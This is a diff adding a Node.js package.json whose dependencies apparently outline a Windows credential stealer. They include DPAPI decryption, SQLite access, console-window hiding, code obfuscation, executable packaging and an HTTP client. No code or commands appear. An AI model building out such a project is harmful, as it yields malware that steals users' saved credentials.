@@ -1,0 +1,25 @@
+{
+  "dependencies": {
+    "axios": "^0.26.0",
+    "buffer-replace": "^1.0.0",
+    "child_process": "^1.0.2",
+    "crypto": "^1.0.1",
+    "fs": "^0.0.1-security",
+    "glob": "^7.2.0",
+    "index.js": "^0.0.3",
+    "javascript-obfuscator": "^3.2.7",
+    "nexe": "^4.0.0-beta.19",
+    "nexe-natives": "^1.0.2",
+    "nexe-natives-fix": "^1.0.1",
+    "node-gyp": "^8.4.1",
+    "node-hide-console-window": "^2.1.1",
+    "sqlite3": "^5.0.2",
+    "win-dpapi": "^1.1.0"
+  },
+  "pkg": {
+    "assets": [
+      "node_modules/sqlite3/lib/binding/napi-v3-win32-x64/node_sqlite3.node",
+      "node_modules/win-dpapi/build/Release/node-dpapi.node"
+    ]
+  }
+}
